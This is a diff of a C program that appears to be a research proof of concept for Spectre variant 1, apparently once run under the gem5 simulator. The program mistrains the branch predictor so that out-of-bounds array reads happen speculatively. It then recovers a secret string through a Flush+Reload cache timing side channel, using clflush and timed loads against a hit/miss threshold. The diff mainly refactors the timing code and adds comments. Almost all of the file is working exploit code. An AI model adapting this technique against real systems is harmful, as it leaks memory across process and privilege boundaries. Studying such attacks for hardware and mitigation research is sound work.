@@ -1,23 +1,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <pthread.h> // why need pthread?
 #include <errno.h>
 #include <x86intrin.h>
 #include <stdint.h>
-#include "/root/Project/gem5/include/gem5/m5ops.h"
-#include "m5_mmap.h"
-
-#define GEM5
+// #include "/root/Project/gem5/include/gem5/m5ops.h"
+// #include "m5_mmap.h"
 
 unsigned int arr1_size = 16;
 uint8_t  arr1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t arr2[256 * 512] ;
-char * secret = "This is the secret" ;// 18 bytes
-uint8_t temp = 123; // used to and the loaded memo
+char * secret = "This is the sensitive data" ;// 18 bytes
 
 
-static __inline__ unsigned Load(int *addr){
+static __inline__ unsigned Load(uint8_t *addr){
     volatile unsigned val;
     asm __volatile__(
                   " movl (%1), %%eax \n"
@@ -29,7 +25,7 @@ static __inline__ unsigned Load(int *addr){
 }
 
 
-static __inline__ unsigned LoadAndMeasure(int *addr){
+static __inline__ unsigned LoadAndMeasure(uint8_t *addr){
     volatile unsigned val;
     asm __volatile__(
 		  " mfence \n"
@@ -51,30 +47,31 @@ static __inline__ unsigned LoadAndMeasure(int *addr){
 
 
 int main(int argc, char ** argv){
-  int temp =1;
-  size_t malicious_index = (size_t) (secret - (char*)arr1);
+
+  size_t malicious_index = (size_t) (secret - (char*)arr1 ); // the malicious index is the first character in secret (which is T)
 
   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM
 
-  // printf("secret is %p, arr1 is %p, arr2 is %p,malicous index is %ld \n",secret, arr1, arr2 , malicious_index);
+  int hit_time = LoadAndMeasure(&arr2[256*512]); // the last data should in the cache 
+  printf("hit time in this machine is %d\n", hit_time);
 
-  __sync_synchronize();
-  int mytime = LoadAndMeasure(&arr2[256*512]);
-  printf("hit time %d\n", mytime);
   _mm_clflush(&arr2[256*512]);
-  mytime = LoadAndMeasure(&arr2[256*512]);
-  printf("misstime is %d\n", mytime);
+  int miss_time = LoadAndMeasure(&arr2[256*512]);
+  printf("misstime in this machine is %d\n", miss_time);
+  
+  __sync_synchronize();
 
   int training_x ; 
   int x;
   int mix_i = 0;
-  volatile uint8_t * addr;
-  int junk = 0;
-  int time1, time2;
+  uint8_t * addr;
+  int measured_time;
   static int results[256];
+  int threshold = hit_time + 20;
 
   for (int tries = 50; tries > 0; tries--){
-    for (int i = 0; i < 256; i++) _mm_clflush(&arr2[i * 512]);
+
+    for (int i = 0; i < 256; i++) _mm_clflush(&arr2[i * 512]); // flush all the cache line 
 
     training_x = tries % arr1_size;
 
@@ -85,64 +82,34 @@ int main(int argc, char ** argv){
 
       x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-      x = training_x ^ (x & (malicious_index ^ training_x));
-      // printf("x is %d, malicousx is %ld \n", x, malicious_index);
+      x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
+
+      /********** Victim **************/
       if (x < arr1_size){
-        temp &= arr2[arr1[x] * 512];
+        Load(&arr2[arr1[x] * 512]);
       }
+      /********** Victim **************/
     }
     
-    __sync_synchronize();
     for (int i = 0; i < 256; i++){
-      mix_i = ((i * 167) + 13) & 255;
+      mix_i = ((i * 167) + 13) & 255; 
       addr = & arr2[mix_i * 512];
-      // printf("mix i is %d\n", mix_i);
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      measured_time = LoadAndMeasure(addr);
       
-      if(mix_i == 84) printf("time 2 is %d, mixi is %d\n", time2, mix_i);
-      if ((int)time2 <= 80 && mix_i != arr1[tries % arr1_size]){
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
+      if (measured_time <= threshold && mix_i != arr1[training_x]){ // arr1[training_x] will also loaded in cache for fool predictor
+        results[mix_i]++; // hit one time
       }
+
     }
   }
-
 
 
   for (int m = 0; m < 255; m++){
     if (results[m] != 0){
-      printf("index is %d, char is %c, value is %d\n", m, (uint8_t)m , results[m] );
+      printf("guessed ASCII decimal is %d, corresponding char is %c, cache hit time is %d over total 50 times\n", m, (uint8_t)m , results[m] );
     } 
   }
-
-
-  printf("done!\n");
 
   return 0;
 
 }
-
-
-// magic, check branch pre state, next instruction, 
-// // #ifdef GEM5
-// //     // m5op_addr = 0xFFFF0000;
-// //     // map_m5_mem();
-// //     m5_work_begin_addr(0,0);
-// // #endif
-//   //char c = getc(stdin);
-//   printf("size is %ld\n", sizeof(arr1));
-//   if (x < sizeof(arr1)){
-//     Load(arr2 + 32); // won't execute it
-//     // m5
-//     printf("hello\n");
-//   } 
-// // #ifdef GEM5
-// //     m5_work_end_addr(0,0);
-// // #endif
-
-//   int time=LoadAndMeasure(arr2 + 32 );
-//   fprintf(stderr, "The hit time is %d\n", time);
-
-//   time=LoadAndMeasure(arr2 );
-//   fprintf(stderr, "The miss time is %d\n", time);
